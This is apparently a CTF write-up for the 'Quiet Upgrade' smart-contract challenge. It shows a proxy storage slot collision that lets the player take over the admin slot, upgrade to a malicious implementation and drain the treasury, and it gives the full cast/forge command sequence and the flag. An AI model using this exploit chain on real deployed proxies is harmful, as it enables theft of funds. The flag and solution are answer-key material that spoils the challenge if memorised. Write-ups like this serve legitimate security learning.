# Quiet Upgrade

**Event:** HICyberCon CTF 2026
**Category:** misc
**Flag:** `hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}`

---

Flag: `hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}`

## Win condition

`Setup.isSolved()` - the treasury's STL reserve must fall below 1% of its starting 5_000_000 ether.
The only way STL leaves `Treasury` is `release(to, amount)`, gated on `msg.sender == settlementSystem`,
and `settlementSystem` is wired to the **proxy**.

## The bug: naive proxy slot collision

`SettlementProxy` keeps its pointers in plain sequential slots:

    slot 0  admin
    slot 1  implementation

but `SettlementV1` - reached only through the proxy's `delegatecall` fallback - declares its own
storage starting at slot 0:

    slot 0  branchOperator        (collides with proxy.admin)
    slot 1  branchRegistrar       (collides with proxy.implementation; never written by V1)
    slot 2  branchClaimed
    slot 3  ledger
    slot 4  totalSettled

`registerBranch(operator)` is open (there is no registrar wired in) and writes
`branchOperator = operator`, i.e. **proxy slot 0 → proxy.admin**. That is a direct admin takeover.
Slot 1 is never written by V1, so the implementation pointer is not clobbered by accident.

## Exploit chain

1. `proxy.registerBranch(player)` - fallback → delegatecall into V1 → `proxy.admin = player`.
   (Confirmed via `cast call proxy 'admin()(address)'` before proceeding.)
2. Deploy a malicious implementation and prove it was built for this proxy:
   `proxiableSlot()` must return `keccak256(abi.encodePacked(keccak256("quiet-upgrade.proxiable"), address(this)))`
   with `address(this)` = the proxy. Reproduced off-chain:
   `0xbd66a804753105e7deead67d70049a37cd9a22a3f7e9631e4bcb7f4b89c25adf`.
3. `proxy.upgradeTo(malicious)` - admin-only, guard satisfied.
4. `proxy.drain()` - delegatecall into the malicious impl; it calls
   `treasury.release(player, reserveBalance())`. Because the code runs in the proxy's context,
   the external call to `Treasury` originates from the proxy address, so
   `require(msg.sender == settlementSystem)` passes.

## Addresses (this instance, chain_id 31337)

    setup     0xBFbFE7494F89DCb565CCe17f37B3Dd0e7De3beD4
    player    0xeA99e9697FBB584E1149744A420Fd26A4B32919B
    proxy     0xd9cd37180cd01d80521f20f7bf3c0d55aa909672
    treasury  0xf57d512437b9aba5a5f0017386a928eed0da4a86
    stl       0x86f5cb0e1f3e2e14658da4e2cf74285711e9f8c4
    ops       0xd2da42204fae27d6a0d69541787b2fdedf0c5c14
    malicious 0xDa0FBD7b18Ac5A666705e9fd9774018D5E149874

## Result

    treasury reserve: 5000000000000000000000000 -> 0
    player STL:       200000000000000000000 -> 5000200000000000000000000
    isSolved():       true
    GET /flag:        hiCTF{sl0t0_c0llision_then_a_qu1et_upgrade_4bcccd7d74}

## Commands

```bash
export PATH="$PATH:$HOME/.foundry/bin"
R=https://quiet-upgrade-8a81d12597a1.chall.hiddeninvestigations.net/
PK=0x...   # from GET /info
P=0xd9cd37180cd01d80521f20f7bf3c0d55aa909672
T=0xf57d512437b9aba5a5f0017386a928eed0da4a86

cast send $P 'registerBranch(address)' $PLAYER --rpc-url $R --private-key $PK
forge create Malicious.sol:Malicious --rpc-url $R --private-key $PK --broadcast \
  --constructor-args $P $T $PLAYER
cast send $P 'upgradeTo(address)' $MALICIOUS --rpc-url $R --private-key $PK
cast send $P 'drain()' --rpc-url $R --private-key $PK
curl -s $R/flag
```

